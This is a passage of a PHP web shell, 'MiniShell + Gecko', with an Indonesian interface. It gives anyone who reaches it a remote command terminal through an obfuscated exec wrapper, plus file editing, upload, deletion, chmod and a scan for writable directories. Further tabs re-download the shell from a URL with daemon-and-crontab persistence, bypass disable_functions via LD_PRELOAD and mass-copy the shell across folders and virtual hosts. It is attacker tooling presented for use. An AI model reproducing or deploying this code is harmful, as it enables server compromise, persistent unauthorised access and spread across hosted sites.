        $target = $dir . '/' . $f;
        if (is_dir($target)) { $s_e("rm -rf " . escapeshellarg($target)); } 
        else { unlink($target); }
    }
    $msg = "File terpilih berhasil dihapus!";
}

if (isset($_POST['rename_submit'])) {
    if (rename($dir . '/' . $_POST['old'], $dir . '/' . $_POST['new'])) {
        $msg = "Rename berhasil!";
    }
}

if (isset($_POST['chmod_submit'])) {
    if (chmod($dir . '/' . $_POST['target'], octdec($_POST['chmod_val']))) {
        $msg = "Chmod berhasil!";
    }
}

if (isset($_POST['save'])) {
    $f_p_c($_POST['path'], $_POST['content']);
    $msg = "File berhasil disimpan!";
}

if (isset($_POST['create_file']) && !empty($_POST['new_filename'])) {
    $new_file = $dir . '/' . basename($_POST['new_filename']);
    if (!file_exists($new_file)) {
        $f_p_c($new_file, '');
        $msg = "File '{$_POST['new_filename']}' berhasil dibuat!";
    } else {
        $msg = "File sudah ada!";
    }
}

if (isset($_POST['create_dir']) && !empty($_POST['new_dirname'])) {
    $new_dir = $dir . '/' . basename($_POST['new_dirname']);
    if (!is_dir($new_dir)) {
        mkdir($new_dir, 0755);
        $msg = "Folder '{$_POST['new_dirname']}' berhasil dibuat!";
    } else {
        $msg = "Folder sudah ada!";
    }
}

$writable_dirs = [];
if (isset($_POST['find_writable'])) {
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS | FilesystemIterator::FOLLOW_SYMLINKS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        $iterator->setMaxDepth(6);
        foreach ($iterator as $item) {
            if ($item->isDir() && is_writable($item->getPathname())) {
                $writable_dirs[] = $item->getPathname();
            }
        }
    } catch (Exception $e) {}
}

$out = "";
if (isset($_POST['cmd'])) { $out = $s_e($_POST['cmd'] . " 2>&1"); }

function ep($p) { return str_replace('%2F', '/', rawurlencode($p)); }

function get_perms($f) { return substr(sprintf('%o', fileperms($f)), -4); }

function get_owner($f) {
    if (function_exists('posix_getpwuid')) {
        $info = posix_getpwuid(fileowner($f));
        return $info['name'];
    }
    return fileowner($f);
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) { $bytes = number_format($bytes / 1073741824, 2) . ' GB'; }
    elseif ($bytes >= 1048576) { $bytes = number_format($bytes / 1048576, 2) . ' MB'; }
    elseif ($bytes >= 1024) { $bytes = number_format($bytes / 1024, 2) . ' KB'; }
    elseif ($bytes > 1) { $bytes = $bytes . ' bytes'; }
    else { $bytes = '0 bytes'; }
    return $bytes;
}

$parts = explode('/', $dir);
?>
<!DOCTYPE html>
<html style="background:#111;color:#ccc;font-family:monospace;">
<head>
    <title>MiniShell + Gecko</title>
    <style>
        a { color: cyan; text-decoration: none; }
        a:hover { text-decoration: underline; }
        input[type="text"] { background: #222; color: #fff; border: 1px solid #444; padding: 2px; }
        input[type="submit"], button { cursor: pointer; }
        table tr:hover { background: #222; }
        .nav-header { display: flex; justify-content: space-between; align-items: center; border: 1px solid #333; padding: 10px; margin-bottom: 10px; }
    </style>
    <script>
        function toggleSelect(source) {
            checkboxes = document.getElementsByName('files[]');
            for(var i in checkboxes) checkboxes[i].checked = source.checked;
        }
    </script>
</head>
<body style="padding:20px; background:#111; color:#ccc; display: block; height: auto;">

<div class="nav-header">
    <div>
        📍 <?php 
        $path_build = "";
        foreach($parts as $p) {
            if($p==="") { echo "<a href='?d=/'>/</a>"; $path_build="/"; continue; }
            $path_build .= ($path_build=="/" ? "" : "/") . $p;
            echo "<a href='?d=".ep($path_build)."'>$p</a>/";
        }
        ?>
    </div>
    <form method="post" style="margin:0;">
        <button type="submit" name="logout" value="1" style="padding:4px 10px;font-size:12px;">Logout</button>
    </form>
</div>

<div style="border:1px solid #333;padding:8px;margin-bottom:10px;display:flex;gap:12px;flex-wrap:wrap;align-items:center;">
    <a href="?d=<?= ep($dir) ?>&tab=files" style="color:<?= $tab==='files'?'#0f0':'cyan' ?>;">Files</a>
    <a href="?d=<?= ep($dir) ?>&tab=recover" style="color:<?= $tab==='recover'?'#0f0':'cyan' ?>;">Recover</a>
    <a href="?d=<?= ep($dir) ?>&tab=preload" style="color:<?= $tab==='preload'?'#0f0':'cyan' ?>;">Preload</a>
    <a href="?d=<?= ep($dir) ?>&tab=mass" style="color:<?= $tab==='mass'?'#0f0':'cyan' ?>;">Mass Copy</a>
</div>


<?php if ($tab === 'recover'): ?>
<div style="border:1px solid #333;padding:12px;margin-bottom:10px;">
    <h3 style="margin:0 0 10px 0;color:#0f0;">| Auto Recover + Persistence |</h3>
    <form method="post">
        <input type="hidden" name="gecko_recover" value="1">
        <div style="margin:6px 0;">DIR_PATH: <input type="text" name="dir" value="<?= mini_h($dir) ?>" style="width:70%;"></div>
        <div style="margin:6px 0;">FILE_NAME: <input type="text" name="file" value="index.php" style="width:30%;"></div>
        <div style="margin:6px 0;">DOWNLOAD_URL: <input type="text" name="url" value="" style="width:70%;"></div>
        <div style="margin:6px 0;">Persist:
            <select name="persist" style="background:#222;color:#fff;border:1px solid #444;">
                <option value="1">ON (daemon+crontab)</option>
                <option value="0">OFF (one-shot)</option>
            </select>
            <button type="submit" style="padding:6px 14px;margin-left:8px;">Recover</button>
        </div>
    </form>
    <?php
    if (is_array($gecko_out)) {
        mini_print_gecko($gecko_out['r'], $gecko_out['title']);
        if (!empty($gecko_out['persist'])) {
            mini_print_gecko($gecko_out['persist'], '=== persistence ===');
        }
    }
    ?>
</div>
<?php elseif ($tab === 'preload'): ?>
<div style="border:1px solid #333;padding:12px;margin-bottom:10px;">
    <h3 style="margin:0 0 10px 0;color:#0f0;">| Bypass disable_functions (LD_PRELOAD) |</h3>
    <form method="post">
        <input type="hidden" name="gecko_preload" value="1">
        <div style="margin:6px 0;">Mode:
            <select name="pmode" style="background:#222;color:#fff;border:1px solid #444;">
                <option value="cmd">Execute command</option>
                <option value="recover">Recovery (via preload)</option>
            </select>
        </div>
        <div style="margin:6px 0;">CMD: <input type="text" name="pcmd" value="id" style="width:70%;"></div>
        <hr style="border-color:#333;">
        <div style="margin:6px 0;">DIR_PATH: <input type="text" name="dir" value="<?= mini_h($dir) ?>" style="width:70%;"></div>
        <div style="margin:6px 0;">FILE_NAME: <input type="text" name="file" value="index.php" style="width:30%;"></div>
        <div style="margin:6px 0;">DOWNLOAD_URL: <input type="text" name="url" value="" style="width:70%;"></div>
        <div style="margin:6px 0;">Persist:
            <select name="persist" style="background:#222;color:#fff;border:1px solid #444;">
                <option value="1">ON (daemon+crontab)</option>
                <option value="0">OFF (one-shot)</option>
            </select>
            <button type="submit" style="padding:6px 14px;margin-left:8px;">Run</button>
        </div>
    </form>
    <?php if (is_array($gecko_out)) mini_print_gecko($gecko_out['r'], $gecko_out['title']); ?>
</div>
<?php elseif ($tab === 'mass'): ?>
<div style="border:1px solid #333;padding:12px;margin-bottom:10px;">
    <h3 style="margin:0 0 10px 0;color:#0f0;">| Mass Copy (v1 / v2 / v3) |</h3>
    <form method="post">
        <input type="hidden" name="gecko_mass" value="1">
        <div style="margin:6px 0;">Source file: <input type="text" name="src" value="<?= mini_h(rtrim($dir, '/').'/index.php') ?>" style="width:70%;"></div>
        <div style="margin:6px 0;">Mode:
            <select name="mode" onchange="document.getElementById('mc_base_wrap').style.display=(this.value==='v1'?'block':'none');" style="background:#222;color:#fff;border:1px solid #444;">
                <option value="v1">v1 folder</option>
                <option value="v2">v2 system</option>
                <option value="v3">v3 vhost</option>
            </select>
        </div>
        <div id="mc_base_wrap" style="margin:6px 0;">Base path: <input type="text" name="base" value="<?= mini_h($dir) ?>" style="width:70%;"></div>
        <button type="submit" style="padding:6px 14px;margin-top:8px;">Mass Copy</button>
    </form>
    <?php if (is_array($gecko_out)) mini_print_gecko($gecko_out['r'], $gecko_out['title']); ?>
</div>
<?php else: ?>
<div style="border:1px solid #333;padding:10px;margin-bottom:10px;">
    <form method="post" enctype="multipart/form-data" style="display:inline; flex-direction: row; align-items: center;">
        📤 Upload: <input type="file" name="u_file" style="width: auto; background: none; box-shadow: none; display: inline; font-size: 12px;">
        <input type="submit" value="Upload" style="width: auto; padding: 5px 10px;">
    </form>
    <?php if(isset($msg)) echo " | <b style='color:lime'>$msg</b>"; ?>
    <div style="margin-top:8px; display:flex; gap:10px; flex-wrap:wrap; align-items:center;">
        <form method="post" style="display:inline-flex; align-items:center; gap:5px;">
            📄 <input type="text" name="new_filename" placeholder="nama file baru" style="width:160px; padding:4px 8px; font-size:12px;">
            <input type="submit" name="create_file" value="Create File" style="width:auto; padding:4px 10px; font-size:12px;">
        </form>
        <span style="color:#555;">|</span>
        <form method="post" style="display:inline-flex; align-items:center; gap:5px;">
            📁 <input type="text" name="new_dirname" placeholder="nama folder baru" style="width:160px; padding:4px 8px; font-size:12px;">
            <input type="submit" name="create_dir" value="Create Dir" style="width:auto; padding:4px 10px; font-size:12px;">
        </form>
    </div>
    <div style="margin-top:8px;">
        <form method="post" style="display:inline;">
            <input type="submit" name="find_writable" value="🔍 Find Writable Dir" style="width:auto; padding:4px 12px; font-size:12px; background:#333; color:#ff0; border:1px solid #555; cursor:pointer;">
        </form>
        <?php if(isset($_POST['find_writable'])): ?>
        <div style="margin-top:8px; background:#111; border:1px solid #333; padding:8px; max-height:200px; overflow-y:auto; font-size:12px;">
            <?php if(empty($writable_dirs)): ?>
                <span style="color:#f55;">Tidak ada direktori writable ditemukan di bawah <?= htmlspecialchars($dir) ?></span>
            <?php else: ?>
                <span style="color:#aaa;">Ditemukan <?= count($writable_dirs) ?> writable dir dari <?= htmlspecialchars($dir) ?>:</span><br><br>
                <?php foreach($writable_dirs as $wd): ?>
                    <a href="?d=<?= ep($wd) ?>" style="color:#0f0; display:block; word-break:break-all;"><?= htmlspecialchars($wd) ?></a>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>
        <?php endif; ?>
    </div>
</div>

<div style="border:1px solid #333;padding:10px;margin-bottom:10px;">
    <form method="post" style="flex-direction: row;">
        <input type="text" name="cmd" style="width:80%; text-align: left; padding-left: 10px;" placeholder="Terminal Command...">
        <button type="submit" style="padding: 10px;">Run</button>
    </form>
    <?php if($out): ?><pre style="background:#000;padding:10px;color:#0f0;border:1px solid #0f0; overflow:auto; text-align: left; width: 98%;"><?= htmlspecialchars($out) ?></pre><?php endif; ?>
</div>

<?php if(isset($_GET['edit'])): ?>
<div style="border:1px solid #333;padding:10px;margin-bottom:10px;">
    <h3>Editing: <?= basename($_GET['edit']) ?></h3>
    <form method="post" style="align-items: flex-start;">
        <input type="hidden" name="path" value="<?= $_GET['edit'] ?>">
        <textarea name="content" style="width:100%;height:300px;background:#222;color:#fff; border: 1px solid #444;"><?= htmlspecialchars($f_g_c($_GET['edit'])) ?></textarea><br>
        <div>
            <button type="submit" name="save" style="background:green;color:white;padding:5px 15px; border: none; cursor: pointer;">Save Changes</button>
            <a href="?d=<?= ep($dir) ?>" style="color:red;margin-left:10px; font-size: 14px;">Cancel</a>
        </div>
    </form>
</div>
<?php endif; ?>

<form method="post">
<table width="100%" border="1" style="border-collapse:collapse;border-color:#333;">
    <tr style="background:#222;">
        <th width="20px"><input type="checkbox" onclick="toggleSelect(this)" style="width: auto; margin: 0;"></th>
        <th>Name</th>
        <th>Size</th>
        <th>Owner</th>
        <th>Perms</th>
        <th>Action</th>
    </tr>
    <?php
    $items = scandir($dir);
    $folders = []; $files = [];
    foreach($items as $i) {
        if($i == "." || $i == "..") continue;
        if(is_dir($dir."/".$i)) $folders[] = $i; else $files[] = $i;
    }
    $sorted_items = array_merge($folders, $files);

    foreach($sorted_items as $i) {
        $full = $dir."/".$i;
        $is_d = is_dir($full);
        $size = $is_d ? "—" : formatSize(filesize($full));
        $perm = get_perms($full);
        $owner = get_owner($full);
        $writable = is_writable($full);
        ?>
        <tr>
            <td align="center"><input type="checkbox" name="files[]" value="<?= $i ?>" style="width: auto; margin: 0;"></td>
            <td style="padding-left: 5px;">
                <?php if($is_d): ?>
                    📁 <a href="?d=<?= ep($full) ?>" style="color:yellow"><?= $i ?></a>
                <?php else: ?>
                    📄 <a href="?d=<?= ep($dir) ?>&edit=<?= ep($full) ?>" style="color:white"><?= $i ?></a>
                <?php endif; ?>
            </td>
            <td align="right" style="padding-right:10px;"><?= $size ?></td>
            <td align="center"><?= $owner ?></td>
            <td align="center">
                <span style="color: <?= $writable ? '#00ff00' : '#ff0000'; ?>;">
                    <?= $perm ?>
                </span>
            </td>
            <td align="center">
                <div style="display: flex; justify-content: center; align-items: center; gap: 5px;">
                    <form method="post" style="display:inline; flex-direction: row; width: auto;">
                        <input type="hidden" name="old" value="<?= $i ?>">
                        <input type="text" name="new" value="<?= $i ?>" size="10" style="font-size: 10px; padding: 2px; margin: 0; width: 60px;">
                        <input type="submit" name="rename_submit" value="Rename" style="font-size:10px; padding: 2px 5px; margin: 0; width: auto;">
                    </form>
                    |
                    <form method="post" style="display:inline; flex-direction: row; width: auto;">
                        <input type="hidden" name="target" value="<?= $i ?>">
                        <input type="text" name="chmod_val" value="<?= $perm ?>" size="4" style="font-size: 10px; padding: 2px; margin: 0; width: 40px;">
                        <input type="submit" name="chmod_submit" value="Chmod" style="font-size:10px; padding: 2px 5px; margin: 0; width: auto;">
                    </form>
                    |
                    <?php 
                    if(!$is_d) echo '<a href="?d='.ep($dir).'&edit='.ep($full).'" style="color:lime; font-size: 11px;">Edit</a> | ';
                    if(strtolower(pathinfo($i, PATHINFO_EXTENSION)) == 'zip') echo '<a href="?d='.ep($dir).'&unzip='.ep($i).'" style="color:orange; font-size: 11px;">Unzip</a> | ';
                    ?>
                    <a href="?d=<?= ep($dir) ?>&del=<?= ep($i) ?>" style="color:red; font-size: 11px;" onclick="return confirm('Hapus?')">Del</a>
                </div>
            </td>
        </tr>
        <?php
    }
    ?>
</table>
<div style="margin-top:10px;">
    <input type="submit" name="bulk_del" value="Delete Selected" style="background:#900;color:white;padding:5px 15px;cursor:pointer; width: auto; font-size: 12px;" onclick="return confirm('Hapus file yang dipilih?')">
    <input type="submit" name="zip_del" value="Zip Selected" style="background:#2980b9;color:white;padding:5px 15px;cursor:pointer; width: auto; font-size: 12px;">
</div>
</form>

<?php endif; ?>
</body>
</html>
